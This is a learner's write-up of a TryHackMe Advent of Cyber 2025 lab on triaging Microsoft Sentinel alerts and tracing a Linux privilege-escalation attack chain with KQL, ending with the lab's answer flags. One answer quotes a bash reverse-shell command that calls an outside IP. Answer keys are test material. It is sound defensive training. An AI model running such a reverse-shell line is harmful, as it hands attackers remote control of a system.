# 🎄 Advent of Cyber 2025 — Day 10  
<img src="./images/day10-banner.png" width="900"/>

**Title:** SOC Alert Triaging - Tinsel Triage                                                 
**Date Completed:** Dec 2025  
**Difficulty:** Medium  
**Category:** SOC Operations, SIEM, Microsoft Sentinel, Log Analysis  
**Room Link:** [SOC Alert Triaging - Tinsel Triage](https://tryhackme.com/room/azuresentinel-aoc2025-a7d3h9k0p2)  
**Status:** ✔ Completed  

---

## 🧭 Overview  
The SOC at **The Best Festival Company** is under a storm of alerts. Azure Sentinel dashboards are lighting up, indicating possible compromise attempts from the Evil Bunnies.  
Today’s task is all about **SOC triage**, **alert prioritisation**, and **investigating Microsoft Sentinel incidents** to uncover suspicious cloud activity.

---

# 🧩 Task-by-Task Write-Up

---

## 📝 Task 1 — Understanding Alert Triage

When alerts flood in, SOC analysts cannot open everything blindly — triage is essential.

### Key triage factors:
- **Severity:** How urgent is it?  
- **Timestamp & frequency:** Is activity ongoing or repeated?  
- **Attack stage:** Recon → Access → PrivEsc → Persistence → Exfiltration  
- **Affected asset:** Which machine/user/resource is impacted?  

These 4 factors guide analysts to focus on **real threats** and deprioritise noise.

---

## 🔍 Task 2 — Working with Microsoft Sentinel

Inside Azure Sentinel:

1. View incidents in **Sentinel → Threat Management → Incidents**  
2. Focus on **High Severity** alerts  
3. Investigate metadata:  
   - Number of events  
   - Entities involved  
   - MITRE tactic (e.g., PrivEsc)  
4. Open **View full details**  
5. Check:  
   - Timeline  
   - Similar incidents  
   - Evidence (command executions, auth logs, kernel actions)

Example high-severity alert investigated:  
**Linux PrivEsc – Kernel Module Insertion**

Findings included:
- 3 correlated events  
- Same machine involved across PrivEsc alerts  
- Progression of attacker behaviour  

---

## ⚡ Task 3 — Related Alerts & Attack Path Analysis

Multiple alerts across the same host can indicate a multi-stage intrusion:

| Alert | Meaning |
|-------|---------|
| Root SSH login from external IP | Initial access |
| SUID discovery | Attacker looking for privilege escalation |
| Kernel module insertion | Persistence technique |

This is how SOC analysts reconstruct **attack chains**.

---

## 🧵 Task 4 — Deep Log Analysis (KQL)

Switching Sentinel to **KQL mode**, McSkidy inspected raw logs:

```kql
set query_now = datetime(2025-10-30T05:09:25.9886229Z);
Syslog_CL
| where host_s == 'app-02'
| project _timestamp_t, host_s, Message
```

This revealed suspicious behaviour:

- Copying `/etc/shadow` backup  
- Adding user **Alice** to sudoers  
- Modifying **backupuser**  
- Loading kernel module `malicious_mod.ko`  
- Root SSH authentication  

Clear signs of PrivEsc & persistence.

---

# 🏁 Final Answers / Flags  

**Q: How many entities are affected by the Linux PrivEsc - Polkit Exploit Attempt alert?**  
```
10
```

**Q: What is the severity of the Linux PrivEsc - Sudo Shadow Access alert?**  
```
High
```

**Q: How many accounts were added to the sudoers group in the Linux PrivEsc - User Added to Sudo Group alert?**  
```
4
```

**Q: What is the name of the kernel module installed in websrv-01?**  
```
malicious_mod.ko
```

**Q: What unusual command was executed within websrv-01 by the ops user?**  
```
/bin/bash -i >& /dev/tcp/198.51.100.22/4444 0>&1
```

**Q: What is the source IP of the first successful SSH login to storage-01?**  
```
172.16.0.12
```

**Q: What is the external IP that successfully logged in as root to app-01?**  
```
203.0.113.45
```

**Q: Aside from backupuser, what user was added to sudoers inside app-01?**  
```
deploy
```

---

# 🎯 Learning Objectives Achieved
- How SOC teams prioritise alerts using triage principles  
- How to investigate alerts in **Microsoft Sentinel**  
- Understanding entity correlation & multi-stage attack chains  
- Performing raw log analysis using **KQL**  
- Identifying PrivEsc, persistence, and suspicious command execution  

---

# 📘 What I Learned Today  
> “Alert storms are normal — knowing what to triage first is what makes an analyst effective.”

---

# 🔜 Next Step  
Proceed to **Day 11** of Advent of Cyber 2025.

